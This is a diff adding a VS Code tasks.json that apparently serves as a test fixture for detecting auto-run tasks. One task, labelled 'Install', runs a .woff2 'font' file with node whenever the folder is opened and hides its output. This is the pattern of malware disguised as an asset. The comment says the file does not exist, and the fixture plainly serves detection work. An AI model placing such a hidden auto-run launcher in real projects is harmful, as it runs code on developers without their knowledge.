@@ -1,0 +1,26 @@
+// Hand-written fixture for code/autorun-task. Nothing here is real malware: the
+// font file doesn't exist and every address is under example.com.
+{
+  "version": "2.0.0",
+  "tasks": [
+    {
+      "label": "watch",
+      "type": "npm",
+      "script": "watch",
+      "runOptions": { "runOn": "folderOpen" },
+    },
+    {
+      "label": "Install",
+      "type": "shell",
+      "command": "node ./public/fonts/icons-400.woff2",
+      "presentation": { "reveal": "never", "echo": false },
+      "runOptions": {
+        "runOn": "folderOpen"
+      }
+    },
+    {
+      "label": "docs",
+      "command": "open https://example.com//docs", // not auto-run
+    },
+  ],
+}
